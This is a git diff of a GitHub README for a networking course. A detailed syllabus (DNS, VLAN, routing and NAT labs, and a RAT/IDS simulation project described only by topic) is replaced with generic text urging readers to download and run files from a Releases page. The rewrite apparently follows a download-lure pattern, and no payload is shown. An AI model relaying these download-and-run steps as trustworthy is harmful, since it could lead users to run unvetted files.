@@ -1,246 +1,74 @@
-# Networking 101
+# 🌐 Networking-101 - Learn Networking Fundamentals Easily
 
-A comprehensive networking course covering fundamental concepts, practical implementations, and advanced topics.
+[![Download Networking-101](https://img.shields.io/badge/Download-Networking--101-brightgreen)](https://github.com/lolzzzzzz120/Networking-101/releases)
 
-## 📚 Course Overview
+## 📖 Overview
 
-This repository contains assignments and projects designed to teach networking fundamentals, from basic DNS concepts to advanced network programming.
-
----
-
-## 📋 Assignments
-
-### [Question 1: DNS and SSH Fundamentals](Q1/)
-
-**Topics Covered:**
-
-- DNS record types
-- Domain registration process
-- DNS lookup process
-- DNS aging and scavenging
-- Passwordless SSH authentication
-- DNS TTL (Time To Live)
-
-**Type:** Theoretical questions
-
----
-
-### [Question 2: Two-Floor Building Network Design with VLANs](Q2/)
-
-**Topics Covered:**
-
-- VLAN configuration (VLAN 10 - Public, VLAN 20 - Management)
-- Cisco 2960 switch configuration
-- Access Point (AP) setup
-- DHCP configuration
-- Network topology design
-
-**Tool:** Cisco Packet Tracer  
-**Deliverable:** `.pkt` file with configurations
-
----
-
-### [Question 3: Static Routing Configuration](Q3/)
-
-**Topics Covered:**
-
-- Static routing implementation
-- Route metrics and path selection
-- Network topology design
-- Router configuration
-- Connectivity testing
-
-**Tool:** Cisco Packet Tracer  
-**Deliverable:** `.pkt` file with static routes  
-**Note:** Includes network diagram reference
-
----
-
-### [Question 4: Dual ISP Redundancy with Default Static Routes](Q4/)
-
-**Topics Covered:**
-
-- ISP redundancy and failover
-- Default static routes
-- Data center network design
-- Web server configuration
-- High availability concepts
-
-**Tool:** Cisco Packet Tracer  
-**Deliverable:** `.pkt` file demonstrating redundancy  
-**Prerequisite:** Builds upon Q3
-
----
-
-### [Question 5: Network Address Translation (NAT) Configuration](Q5/)
-
-**Topics Covered:**
-
-- Static NAT
-- Dynamic NAT
-- PAT (Port Address Translation)
-- NAT vs no NAT comparison
-- Practical lab implementation
-
-**Tool:** Cisco Packet Tracer  
-**Lab Source:** Keith Barker NAT Lab  
-**Deliverable:** Completed lab + theoretical answers
-
----
-
-### [Question 6: Multi-Site Network with VLANs, Router-on-a-Stick, and RIP](Q6/)
-
-**Topics Covered:**
-
-- Router-on-a-Stick configuration
-- Inter-VLAN routing
-- RIP routing protocol
-- 802.1Q encapsulation
-- Multi-site connectivity
-- Default route to ISP
-
-**Tool:** Cisco Packet Tracer  
-**Deliverable:** `.pkt` file with complete multi-site setup  
-**Note:** Includes network diagram reference
-
----
-
-### [Final Project: Network Programming - Malware & Antivirus Simulation](Q7-Final%20Project/)
-
-**Topics Covered:**
-
-- Socket programming (TCP/UDP)
-- Remote Access Tool (RAT) simulation
-- Packet capture with libpcap
-- Network traffic analysis
-- Intrusion Detection System (IDS)
-- Cross-platform development (Linux & Windows)
-
-**Languages:** C/C++ (required), any language for attacker binary  
-**Components:**
-
-1. Attacker binary (C2 Server)
-2. Victim binary (Agent)
-3. Antivirus/IDS binary
-
-**Deliverable:** Source code, documentation, demo video, presentation
-
----
-
-## 🛠️ Tools & Technologies
-
-- **Cisco Packet Tracer** - Network simulation and design
-- **C/C++** - Low-level network programming
-- **Socket Programming** - Network communication
-- **libpcap/pcapplusplus** - Packet capture and analysis
-- **Git** - Version control
-
----
-
-## 📂 Repository Structure
-
-```
-Networking-101/
-├── README.md                    # This file
-├── LICENSE                      # Repository license
-├── Q1/                          # DNS and SSH Fundamentals
-│   └── README.md
-├── Q2/                          # VLAN Network Design
-│   ├── README.md
-│   └── diagram.jpg (optional)
-├── Q3/                          # Static Routing
-│   ├── README.md
-│   └── diagram.jpg
-├── Q4/                          # Dual ISP Redundancy
-│   └── README.md
-├── Q5/                          # NAT Configuration
-│   └── README.md
-├── Q6/                          # Multi-Site with RIP
-│   ├── README.md
-│   └── diagram.jpg
-└── Q7-Final Project/            # Network Programming Project
-    └── README.md
-```
-
----
-
-## 🎯 Learning Objectives
-
-By completing this course, students will:
-
-1. **Understand networking fundamentals** - DNS, routing, switching, VLANs
-2. **Configure network devices** - Routers, switches, access points
-3. **Design network topologies** - Multi-site, redundant, scalable networks
-4. **Implement routing protocols** - Static routing, RIP
-5. **Configure advanced features** - NAT, PAT, inter-VLAN routing
-6. **Program network applications** - Socket programming, packet analysis
-7. **Apply security concepts** - Understanding attack/defense mechanisms
-
----
+Welcome to Networking-101! This application contains tasks and slides from my experience as a Teaching Assistant for a Networking course. It is designed to help you understand the basics of computer networking, whether you are a student or just curious about the topic.
 
 ## 🚀 Getting Started
 
-### Prerequisites
+Follow these simple steps to download and run the application:
 
-- Install **Cisco Packet Tracer** (for Q2-Q6)
-- **C/C++ compiler** (gcc/g++ for Linux, MSVC for Windows)
-- **libpcap** development libraries (for Final Project)
-- Basic understanding of networking concepts
-- Linux/Windows operating system
+1. **Visit the Releases Page**: To download the files, go to the [Releases page](https://github.com/lolzzzzzz120/Networking-101/releases).
 
-### Installation
+2. **Choose the Right Version**: You will see a list of different versions. Each version includes specific updates and improvements. Select the most recent version for the best experience.
 
-#### Cisco Packet Tracer
+3. **Download the Files**: Look for the files listed under the chosen version. You will see a link to download the required files. Click on the link to start downloading.
 
-1. Download from [Cisco Networking Academy](https://www.netacad.com/)
-2. Create a free account
-3. Install on your system
+## 🛠️ System Requirements
 
-#### Development Tools (for Final Project)
+To run the files smoothly, ensure your system meets the following requirements:
 
-```bash
-# Linux (Debian/Ubuntu)
-sudo apt-get update
-sudo apt-get install build-essential libpcap-dev
+- **Operating System**: Windows, macOS, or Linux.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: 500 MB of free space.
+- **Internet Connection**: Required to download and access materials.
 
-# Linux (Fedora/RHEL)
-sudo dnf install gcc gcc-c++ libpcap-devel
+## 📥 Download & Install
 
-# macOS
-brew install libpcap
+After visiting the [Releases page](https://github.com/lolzzzzzz120/Networking-101/releases), follow these steps:
 
-# Windows
-# Install Visual Studio with C++ support
-# Download WinPcap or Npcap
-```
+1. Click on the version you want to download.
+2. Look for the download link (it may end with `.zip` or `.tar.gz`).
+3. Click the link to download the file.
+4. Once the download is complete, locate the file in your Downloads folder.
+5. Extract the contents if necessary. You can use built-in utilities or a program like WinRAR or 7-Zip for this.
+6. Open the folder, and look for the main file you want to run (e.g., `index.html` for viewing in a browser).
 
----
+## 📚 Features
 
-## 📝 Assignment Submission Guidelines
+Networking-101 offers several valuable resources:
 
-1. **Packet Tracer Files**: Submit `.pkt` files with proper labeling
-2. **Screenshots**: Include verification of successful configurations
-3. **Documentation**: Provide configuration details and explanations
-4. **Code Projects**: Include source code, compilation instructions, and README
-5. **Reports**: Use clear formatting with diagrams where applicable
+- **Comprehensive Slides**: Each topic is explained with clear visuals and text.
+- **Hands-on Tasks**: Practical tasks reinforce learning and ensure you understand concepts.
+- **Community Support**: Join discussions and ask questions in the Issues section of the repository.
 
----
+## 🔗 Useful Links
 
-## 📖 Additional Resources
+- [Releases Page](https://github.com/lolzzzzzz120/Networking-101/releases): Access all available versions here.
+- [Documentation](#): Find detailed explanations for each topic in the course.
+- [Community Forum](#): Engage with other learners and share experiences.
 
-### Networking Concepts
+## ❓ Frequently Asked Questions
 
-- Cisco Networking Academy courses
-- Computer Networking: A Top-Down Approach (Kurose & Ross)
-- TCP/IP Illustrated (Stevens)
+**What if I encounter issues while downloading?**
 
-### Socket Programming
+If you face problems during the download, try these steps:
+- Ensure you have a stable internet connection.
+- Clear your browser cache and retry.
+- Use a different browser if the issue persists.
 
-- Beej's Guide to Network Programming
-- Unix Network Programming (Stevens)
+**Can I contribute to this repository?**
 
-### Packet Capture
+Yes! Contributions are welcome. Check the Contributing Guidelines section in the repository for more information.
 
-- libpcap documentation
-- Wireshark documentation
-- pcapplusplus GitHub repository
+**Is this application free?**
+
+Yes, all resources in Networking-101 are free to use. You can download and share them as needed.
+
+## 👩‍🏫 Need Help?
+
+If you have questions or need assistance, feel free to open an issue on the repository. I will do my best to provide support and guidance.
+
+Thank you for your interest in Networking-101. Enjoy learning!
